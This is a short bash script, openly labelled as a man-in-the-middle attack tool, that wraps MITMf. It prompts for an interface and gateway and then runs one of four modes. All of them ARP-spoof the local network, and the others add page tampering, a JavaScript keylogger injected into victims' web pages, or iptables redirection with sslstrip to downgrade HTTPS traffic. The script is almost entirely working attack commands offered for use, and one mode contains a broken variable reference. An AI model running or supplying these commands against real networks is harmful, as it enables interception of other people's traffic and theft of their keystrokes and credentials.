#! /bin/bash
# Mitmf ( man in middle attack script )withe SSLStrip 
# Date: 07/05/2016
sleep 0.05
echo "$( tput setaf 6) ..........................................................$(tput sgr0)"
sleep 0.05
echo " $( tput setaf 1)[$(tput sgr0)$( tput setaf 2)~$(tput sgr0)$( tput setaf 1)] $(tput sgr0)what is the interface would like to use for Listening $( tput setaf 1)?$(tput sgr0)"
read interface
echo " "
sleep 0.05
echo " $( tput setaf 1)[$(tput sgr0)$( tput setaf 2)~$(tput sgr0)$( tput setaf 1)] $(tput sgr0)enter gateway ip address $( tput setaf 1):$(tput sgr0) "
read gateway
echo "" 
sleep 0.05
echo " $( tput setaf 1)[$(tput sgr0)$( tput setaf 2)~$(tput sgr0)$( tput setaf 1)] $(tput sgr0)Select the type of Spoof $( tput setaf 1):$(tput sgr0)"
echo " "
sleep 0.05
echo  "      $( tput setaf 3)1$(tput sgr0)$( tput setaf 1).$(tput sgr0) Normal Mode" 
sleep 0.05
echo  "      $( tput setaf 3)2$(tput sgr0)$( tput setaf 1).$(tput sgr0) Advanced Mode (Specify a log level )" 
sleep 0.05
echo  "      $( tput setaf 3)3$(tput sgr0)$( tput setaf 1).$(tput sgr0) Injects a javascript keylogger into clients webpages"
sleep 0.05
echo  "      $( tput setaf 3)4$(tput sgr0)$( tput setaf 1).$(tput sgr0) Use SSLStrip To Convert HTTPS Traffic To HTTP"
read number 
case $number in 
'1') 
mitmf -i $interface --spoof --arp -a --gateway $gateway;;
'2')
mitmf -i $interface --spoof --arp -a --gateway $gateway --log-level debug --upsidedownternet;;
'3')
mitmf -i $interface --spoof --jskeylogger --arp -a --gateway $gateway;;
'4')
mitmf -i $interface --spoof $jskeylogger --arp -a --gateway $gateway &iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080&echo "1" > /proc/sys/net/ipv4/ip_forward&sslstrip -f -l 8080;;
esac 
